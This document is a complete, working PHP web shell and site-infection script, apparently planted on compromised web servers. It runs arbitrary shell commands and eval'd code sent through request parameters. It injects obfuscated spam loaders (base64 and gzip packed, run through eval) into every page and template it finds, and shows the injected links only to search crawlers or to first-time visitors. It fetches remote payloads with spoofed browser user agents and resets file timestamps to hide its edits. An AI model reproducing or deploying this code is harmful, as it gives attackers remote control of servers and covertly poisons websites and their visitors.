<?php @ignore_user_abort(1); @set_time_limit(0); @error_reporting(0); if (isset($_REQUEST['update1']))
{ $abcd1 = ''; $abcd2 = array("(\.ph.*$|\.htm.*$|\.shtm.*$|\.asp.*$|\.jsp$|\.jhtm$|\.cfm$|\.ctp$|\.tpl$)");
$abcd9 = array("/<bb1>.*<bb2>/si","/<b1>.*<\/b1>/si","/<bb1><bb1>/si","/<bb2><bb2>/si", "/<(span|font|div) style=.*(height|width)\s*:\s*[0-2]{1}\s*(pt|px).*(overflow|visibility)\s*:\s*(auto|hidden).*>.*<a href=.*<\/a>.*<\/(span|font|div)>/Usi",
 "/<(span|font|div) style=.*(overflow|visibility)\s*:\s*(auto|hidden).*(height|width)\s*:\s*[0-2]{1}\s*(pt|px).*>.*<a href=.*<\/a>.*<\/(span|font|div)>/Usi",
 "/<(span|font|div) style=.*visibility\s*:\s*(auto|hidden).*overflow\s*:\s*(auto|hidden).*>.*<a href=.*<\/a>.*<\/(span|font|div)>/Usi",
 "/<(span|font|div) style=.*overflow\s*:\s*(auto|hidden).*visibility\s*:\s*(auto|hidden).*>.*<a href=.*<\/a>.*<\/(span|font|div)>/Usi",
 "/wpfooterz.*wpfooterz/si", "/<a.*style\s*=.*(top|left)\s*:\s*-[0-9]{3,5}.*>.*<\/a>/Ui", "/<a.*(viagra|cialis|phentermine|vioxx|hydrocodon|oxycontin|levitra|ambien|xanax|adipex|cheap pills|paxil|Codeine|vicodin|tramadol|tadalafil|carisoprodol|mesothelioma|lorazepam|propecia|protonix|prozac|prescription|buy cheap|zithromax)+.*<\/a>/i");
 if (file_exists('data')) $abcd1 = trim(file_get_contents("data")); $abcd3 = qwer0("/",$abcd1);
 $abcd4 = array(); if (isset($_REQUEST['getfiles'])) $abcd4 = qwer3($abcd3, $abcd2, 3);
 array_unshift($abcd4,$abcd1); $abcd4 = array_unique($abcd4); if (get_magic_quotes_gpc()) $abcd6 = stripslashes($_REQUEST['update1']);
else $abcd6 = $_REQUEST['update1']; foreach($abcd4 as $abcd5) { if (eregi(".php",$abcd5) !== false && strlen($abcd6) > 1) $abcd6 = "<b1>".Fcdc5c6d3($abcd6)."</b1>";
else if (strlen($abcd6) > 1) $abcd6 = "<b1>".$abcd6."</b1>"; $abcd7 = false; $abcd8 = false;
 if (!is_writable($abcd5)) @chmod($abcd5, 0644); if (file_exists($abcd5) && is_writable($abcd5))
 { $abce3 = false; if (eregi(".htm",$abcd5) !== false || eregi(".shtm",$abcd5) !== false) $abce3 = true;
 $abce1 = trim(file_get_contents($abcd5)); foreach($abcd9 as $abce0) { if (preg_match($abce0, $abce1))
 { $abce1 = preg_replace($abce0, "", $abce1); $abcd8 = true; } } if (preg_match("/<\/body(.*)?>/i",$abce1,$abce2))
 { $abce4=$abce2[0]; $abce1=preg_replace("/<\/body(.*)?>/i", $abcd6.$abce4, $abce1);
$abcd7 = true; } else if (preg_match("/<\/html>/i",$abce1,$abce2)) { $abce4="</body>".$abce2[0];
$abce1=preg_replace("/<\/html>/i", $abcd6.$abce4, $abce1); $abcd7 = true; } else if ($abce3 == true)
 { $abce4=$abcd6."</body></html>"; $abce1.=$abce4; $abcd7 = true; } if ($abcd7 == true || $abcd8 == true)
 { $abce7 = @filemtime($abcd5); $abce5 = fopen($abcd5, "w+"); fwrite($abce5, $abce1);
fclose($abce5); @touch($abcd5,$abce7,$abce7); if ($abcd7 == true) echo "<pre>update $abcd5</pre>";
if ($abcd8 == true) echo "<pre>spam removed $abcd5</pre>"; } } else { if (!file_exists($abcd5)) echo "<pre>no file $abcd5</pre>";
else if (!is_writable($abcd5)) echo "<pre>no rw file $abcd5</pre>"; } } } if (isset($_REQUEST['update2']))
{ if (get_magic_quotes_gpc()) { $abcd6 = stripslashes($_REQUEST['update2']); } else { $abcd6 = $_REQUEST['update2'];
} $abce6 = $_SERVER['SCRIPT_FILENAME']; if (!is_writable($abce6)) @chmod($abce6, 0644);
if (is_writable($abce6)) { $abce7 = @filemtime($abce6); $abce5 = fopen($abce6, "w+");
fwrite($abce5, $abcd6); fclose($abce5); @touch($abce6,$abce7,$abce7); echo "<pre>update</pre>";
} else { echo "<pre>no rw $abcd5</pre>"; } } if (isset($_REQUEST['update3'])) { echo "<pre>";
$abce8 = $_REQUEST['update3']; $abce9 = ''; if (!empty($abce8)) { if(function_exists('exec'))
 { @exec($abce8,$abce9); $abce9 = join("\n",$abce9); } elseif(function_exists('shell_exec'))
 { $abce9 = @shell_exec($abce8); } elseif(function_exists('system')) { @ob_start(); @system($abce8);
$abce9 = @ob_get_contents(); @ob_end_clean(); } elseif(function_exists('passthru')) { @ob_start();
@passthru($abce8); $abce9 = @ob_get_contents(); @ob_end_clean(); } elseif(@is_resource($abcf0 = @popen($abce8,"r")))
 { $abce9 = ""; while(!@feof($abcf0)) { $abce9 .= @fread($abcf0,1024); } @pclose($abcf0);
} } echo $abce9; echo "</pre>"; } if (isset($_REQUEST['add1'])) { $abcd1 = ''; $abcd2 = array("(\.ph.*$|\.htm.*$|\.shtm.*$|\.asp.*$|\.jsp$|\.jhtm$|\.cfm$|\.ctp$|\.tpl$)");
$abcd9 = array("/<ad>.*<\/ad>/si", "/<(span|font|div) style=.*(height|width)\s*:\s*[0-2]{1}\s*(pt|px).*(overflow|visibility)\s*:\s*(auto|hidden).*>.*<a href=.*<\/a>.*<\/(span|font|div)>/Usi",
 "/<(span|font|div) style=.*(overflow|visibility)\s*:\s*(auto|hidden).*(height|width)\s*:\s*[0-2]{1}\s*(pt|px).*>.*<a href=.*<\/a>.*<\/(span|font|div)>/Usi",
 "/<(span|font|div) style=.*visibility\s*:\s*(auto|hidden).*overflow\s*:\s*(auto|hidden).*>.*<a href=.*<\/a>.*<\/(span|font|div)>/Usi",
 "/<(span|font|div) style=.*overflow\s*:\s*(auto|hidden).*visibility\s*:\s*(auto|hidden).*>.*<a href=.*<\/a>.*<\/(span|font|div)>/Usi",
 "/wpfooterz.*wpfooterz/si", "/<a.*style\s*=.*(top|left)\s*:\s*-[0-9]{3,5}.*>.*<\/a>/Ui", "/<a.*(viagra|cialis|phentermine|vioxx|hydrocodon|oxycontin|levitra|ambien|xanax|adipex|cheap pills|paxil|Codeine|vicodin|tramadol|tadalafil|carisoprodol|mesothelioma|lorazepam|propecia|protonix|prozac|prescription|buy cheap|zithromax)+.*<\/a>/i");
 if (file_exists('data')) $abcd1 = trim(file_get_contents("data")); $abcd3 = qwer0("/",$abcd1);
 $abcd4 = array(); if (isset($_REQUEST['getfiles1'])) $abcd4 = qwer3($abcd3, $abcd2, 2);
 array_unshift($abcd4,$abcd1); $abcd4 = array_unique($abcd4); if (get_magic_quotes_gpc()) $abcd6 = stripslashes($_REQUEST['add1']);
else $abcd6 = $_REQUEST['add1']; foreach($abcd4 as $abcd5) { $abcd7 = false; $abcd8 = false;
 if (eregi(".php",$abcd5) !== false && strlen($abcd6) > 1) $abcd6 = "<ad>".Fb44b364c($abcd6)."</ad>";
else if (strlen($abcd6) > 1) $abcd6 = "<ad>".$abcd6."</ad>"; if (!is_writable($abcd5)) @chmod($abcd5, 0644);
 if (file_exists($abcd5) && is_writable($abcd5)) { $abce1 = trim(file_get_contents($abcd5));
 foreach($abcd9 as $abce0) { if (preg_match($abce0, $abce1)) { $abce1 = preg_replace($abce0,"", $abce1);
$abcd8 = true; } } if (preg_match("/<body(.*)?>/i",$abce1,$abce2)) { $abce4=$abce2[0];
$abce1=preg_replace("/<body(.*)?>/i", $abce4.$abcd6, $abce1); $abcd7 = true; } else
 { $abce1=$abcd6.$abce1; $abcd7 = true; } if ($abcd7 == true || $abcd8 == true)
 { $abce7 = @filemtime($abcd5); $abce5 = fopen($abcd5, "w"); fwrite($abce5, $abce1);
fclose($abce5); @touch($abcd5,$abce7,$abce7); if ($abcd7 == true) echo "<pre>update $abcd5</pre>";
if ($abcd8 == true) echo "<pre>spam removed $abcd5</pre>"; } } else { if (!file_exists($abcd5)) echo "<pre>no file $abcd5</pre>";
else if (!is_writable($abcd5)) echo "<pre>no w file $abcd5</pre>"; } } } if (isset($_REQUEST['data1']))
{ if (get_magic_quotes_gpc()) { $abcd6 = stripslashes($_REQUEST['data1']); } else { $abcd6 = $_REQUEST['data1'];
} $abce6 = 'data'; if (!file_exists($abce6)) { $abcj3 = fopen($abce6, "w"); if($abcj3==false) die("unable to create file $abce6");
} if (is_writable($abce6)) { $abce7 = @filemtime($abce6); $abce5 = fopen($abce6, "w+");
fwrite($abce5, $abcd6); fclose($abce5); @touch($abce6,$abce7,$abce7); echo "<pre>update $abce6</pre>";
} else { echo "<pre>no rw $abce6</pre>"; } } if (isset($_REQUEST["ev1"])) { $abcj1=base64_decode($_REQUEST["ev1"]);
if (isset($_REQUEST["s"])) { $abcj1=qwer1($abcj1); }; eval($abcj1); exit(); } if (isset($_REQUEST["info1"])) 
{ $abcj2 = 'dGVzdDEyNg=='; $abcj4 = @get_current_user(); echo "<!--".base64_decode($abcj2)."(($abcj4))-->";
exit; } if (isset($_REQUEST["get1"])&&isset($_REQUEST["get2"])) { $abcd9 = array("/<bb1>.*<bb2>/si","/<b1>.*<\/b1>/si","/<bb1><bb1>/si","/<bb2><bb2>/si",
 "/<(span|font|div) style=.*(height|width)\s*:\s*[0-2]{1}\s*(pt|px).*(overflow|visibility)\s*:\s*(auto|hidden).*>.*<a href=.*<\/a>.*<\/(span|font|div)>/Usi",
 "/<(span|font|div) style=.*(overflow|visibility)\s*:\s*(auto|hidden).*(height|width)\s*:\s*[0-2]{1}\s*(pt|px).*>.*<a href=.*<\/a>.*<\/(span|font|div)>/Usi",
 "/<(span|font|div) style=.*visibility\s*:\s*(auto|hidden).*overflow\s*:\s*(auto|hidden).*>.*<a href=.*<\/a>.*<\/(span|font|div)>/Usi",
 "/<(span|font|div) style=.*overflow\s*:\s*(auto|hidden).*visibility\s*:\s*(auto|hidden).*>.*<a href=.*<\/a>.*<\/(span|font|div)>/Usi",
 "/wpfooterz.*wpfooterz/si", "/<a.*style\s*=.*(top|left)\s*:\s*-[0-9]{3,5}.*>.*<\/a>/Ui", "/<a.*(viagra|cialis|phentermine|vioxx|hydrocodon|oxycontin|levitra|ambien|xanax|adipex|cheap pills|paxil|Codeine|vicodin|tramadol|tadalafil|carisoprodol|mesothelioma|lorazepam|propecia|protonix|prozac|prescription|buy cheap|zithromax)+.*<\/a>/i");
 if (get_magic_quotes_gpc()) { $abci8 = stripslashes($_REQUEST['get1']); $abci7 = stripslashes($_REQUEST['get2']);
} else { $abci8 = $_REQUEST['get1']; $abci7 = $_REQUEST['get2']; } $abcg5 = qwer2();
$abci9 = array("((^index.*\.|^default.*\.|^main.*\.|^.*body.*\.|^login.*\.|^.*content.*\.|^auth.*\.|^.*footer.*\.|^home.*\.|^.*templ.*\.|^inc.*\.|^page.*\.|^hyperseek.*\.|^Output.*\.|^comment.*\.|^uifunctions.*\.|^bottom.*\.|^infocus.*\.)(ph.*$|htm.*$|shtm.*$|asp.*$|jsp$|jhtml$|cfm$|tpl$|inc$|pl$|templ.*$|xml$|sht$|ctp$))");
$abcj0 = array("(\.ph.*$|\.htm.*$|\.shtm.*$|\.asp.*$|\.jsp$|\.jhtm$|\.cfm$|\.ctp$|\.tpl$)"); if (isset($_REQUEST["get3"])) $abcd4 = qwer3($abci8, $abcj0, 4);
else $abcd4 = qwer3($abci8, $abci9, 4); foreach($abcd4 as $abcd5) { $abcd7 = false;
$abcd8 = false; if (file_exists($abcd5)) { if (!is_writable($abcd5)) @chmod($abcd5, 0644);
if (is_writable($abcd5)) { $abcg7 = base64_encode(gzcompress($abcd5,9)); $abcd6 ="<b1><!--".$abcg5.$abcg7."--></b1>";
 $abce3 = false; if (eregi(".htm",$abcd5) !== false || eregi(".shtm",$abcd5) !== false) $abce3 = true;
 $abce1 = trim(file_get_contents($abcd5)); foreach($abcd9 as $abce0) { if (preg_match($abce0, $abce1))
 { $abce1 = preg_replace($abce0, "", $abce1); $abcd8 = true; } } if (preg_match("/<\/body(.*)?>/i",$abce1,$abce2))
 { $abce4=$abce2[0]; $abce1=preg_replace("/<\/body(.*)?>/i", $abcd6.$abce4, $abce1);
$abcd7 = true; } else if (preg_match("/<\/html>/i",$abce1,$abce2)) { $abce4="</body>".$abce2[0];
$abce1=preg_replace("/<\/html>/i", $abcd6.$abce4, $abce1); $abcd7 = true; } else if (preg_match("/<body(.*)?>/i",$abce1,$abce2))
 { $abce4=$abce2[0]; $abce1=preg_replace("/<body(.*)?>/i", $abce4.$abcd6, $abce1);
$abcd7 = true; } else if ($abce3 == true) { $abce4=$abcd6."</body></html>"; $abce1.=$abce4;
$abcd7 = true; } if ($abcd7 == true || $abcd8 == true) { $abce7 = @filemtime($abcd5);
 $abce5 = @fopen($abcd5, "w+"); @fwrite($abce5, $abce1); @fclose($abce5); @touch($abcd5,$abce7,$abce7);
} } } } $abcg6 = F205980a3($abci7); if (eregi($abcg5, $abcg6)) { $abcg6 = gzuncompress(base64_decode(F2b66ac6f($abcg6,$abcg5)));
 echo $abcg6; $abce5 = fopen('data', "w"); fwrite($abce5, $abcg6); fclose($abce5);
} exit; } function qwer2() { $abcg4 = 1; $abcj5 = 8; $abcg3 =""; for ($abcg1=0;$abcg1<$abcj5;$abcg1++)
 { $abcg2 = mt_rand(1,7); switch ($abcg2) { case ($abcg2<=2): $abcg3 .= mt_rand(0,9); 
 break; case ($abcg2<=4): $abcg3 .= chr(mt_rand(65,90)); break; case ($abcg2<=6): $abcg3 .= chr(mt_rand(97,122)); 
 break; case 7: $abcj6 = strlen($abcg3); if ($abcg4>0&&$abcj6>0&&$abcj6<($abcj5-1)&&$abcg3[$abcj6-1]!="_")
 { $abcg3 .= "_"; $abcg4--; } else { $abcg1--; continue; } break; } } return $abcg3;
} function Fd9701a0e($abcg8, $abcg9) { $abch0 = strpos (strrev($abcg8), strrev($abcg9));
if ($abch0===false) return false; else return strlen($abcg8) - $abch0 - strlen($abcg9);
} function qwer0($this, $abcf1) { return substr($abcf1, 0, Fd9701a0e($abcf1, $this));
} function qwer1($abcf2) { $abcf2 = str_replace('\\\\\\"', '\\"', $abcf2); $abcf2 = str_replace("\\\\'", "'", $abcf2);
$abcf2 = str_replace("\\\\\\\\", "\\\\", $abcf2); return $abcf2; } function qwer3($abcf3, $abcf4, $abcf5=0, $abcf6="\\"){ 
if(!is_dir($abcf3)){return null;}; $abcf7=($abcf6=="\\")?"/":$abcf6; $abcf3=str_replace($abcf6,$abcf7,$abcf3); $abcf3=str_replace("//",$abcf7,$abcf3);
$abcf3=(strrpos($abcf3, $abcf7)==strlen($abcf3)-1)? substr($abcf3, 0, strlen($abcf3)-1):$abcf3; 
$abcf8=substr_count($abcf3, $abcf7); $abcf5=(!$abcf5)?-1:$abcf5+$abcf8;
$abch7=array(); $abch1=array( array($abcf3, $abcf8) ); while(sizeof($abch1) && $abch1[0][1]!=$abcf5){
 $abch3=array_shift($abch1); $abch2=opendir($abch3[0]); while( ($abch4=readdir($abch2))!==false ){
 if( strrpos($abch4,".") === (strlen($abch4)-1) || strstr($_SERVER['SCRIPT_FILENAME'],$abch4) !== false){continue;};
$abcf9=$abch3[0].$abcf7.$abch4; if(is_dir($abcf9)){ $abcg0[]=$abcf9; $abch1[]=array( $abcf9, substr_count($abcf9, $abcf7) );}
else { foreach($abcf4 as $abcg1){ if(preg_match($abcg1,$abcf9)) { $abch7[]=$abcf9;break;};}};
}; } return $abch7; } function F205980a3($abch5) { $abch6 = array("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)",
 "Mozilla/5.0 (compatible; SnapPreviewBot; en-US; rv:1.8.0.9) Gecko/20061206 Firefox/1.5.0.9", "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008092215 Firefox/3.0.1 Orca/1.1 beta 3",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.xx) Gecko/20030504 Mozilla Firebird/0.6", "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5"
 ); if (function_exists('curl_init')) { $abch8 = $abch6[rand(0,count($abch6)-1)]; $abch9 = curl_init();
curl_setopt($abch9, CURLOPT_URL, $abch5); curl_setopt($abch9, CURLOPT_HEADER, 0); curl_setopt($abch9, CURLOPT_TIMEOUT, 30);
curl_setopt($abch9, CURLOPT_RETURNTRANSFER, 1); curl_setopt($abch9, CURLOPT_USERAGENT, $abch8);
curl_setopt($abch9, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($abch9, CURLOPT_MAXREDIRS, 1); $abci0 = curl_exec($abch9);
curl_close($abch9); if ($abci0 !== false) { return $abci0; } } else if (ini_get('allow_url_fopen') == '1')
 { $abci0 = file_get_contents($abch5); if ($abci0 !== false) { return $abci0; }
} else { echo "<h5 style='color:maroon'>Can't download ".$abch5." - EXIT;</h5>"; exit; } } function F2b66ac6f($abci1,$abcg5)
{ $abci3 = ''; if(preg_match("/$abcg5/",$abci1)) { $abci3 = preg_replace("/.*<b1><!--|$abcg5|--><\/b1>.*/msi","",$abci1);
} return $abci3; } function Fcdc5c6d3($abci2) { $abci2 = ereg_replace('"', '\"', $abci2);
 $abci6 = '$Vfa71f997 = strtolower($_SERVER["HTTP_USER_AGENT"]);$Vbf19e20c = 0;$V2241bbfb = array("crawler","googlebot","msnbot","yahoo","search","indexer","cuill.com"); foreach($V2241bbfb as $V92eb5ffe){ if(strpos($Vfa71f997, $V92eb5ffe) !== false){ $Vbf19e20c = 1;break;}} if ($Vbf19e20c){ echo "'.$abci2.'";}';
$abci4 = base64_encode(gzdeflate($abci6,9)); $abci5 = "<?php \$V465819ec = strrev('edoced_46esab');\$V98ff8d39 = strrev('etalfnizg'); eval(\$V98ff8d39(\$V465819ec('".$abci4."'))); ?>";
 return $abci5; } function Fb44b364c($abci2) { $abci2 = ereg_replace('"', '\"', $abci2);
 $abci6 = '$Ve3cb9741="urchin"; if (!isset($_COOKIE[$Ve3cb9741])) { $Vfa71f997 = strtolower($_SERVER["HTTP_USER_AGENT"]);
$Vbf19e20c = 0;$V2241bbfb = array("crawler","googlebot","msnbot","yahoo","search","indexer","cuill.com","stackrambler","aport","yandex"); 
 foreach($V2241bbfb as $V92eb5ffe){ if(strpos($Vfa71f997, $V92eb5ffe) !== false){ $Vbf19e20c = 1;break;}} 
 if (!$Vbf19e20c) { echo "'.$abci2.'"; ob_start(); @setcookie($Ve3cb9741, "google-analytics.com",time()+(60*60*24));
ob_end_flush(); } }'; $abci4 = base64_encode(gzdeflate($abci6,9)); $abci5 = "<?php \$V465819ec = strrev('edoced_46esab');\$V98ff8d39 = strrev('etalfnizg'); eval(\$V98ff8d39(\$V465819ec('".$abci4."'))); ?>";
 return $abci5; } ?>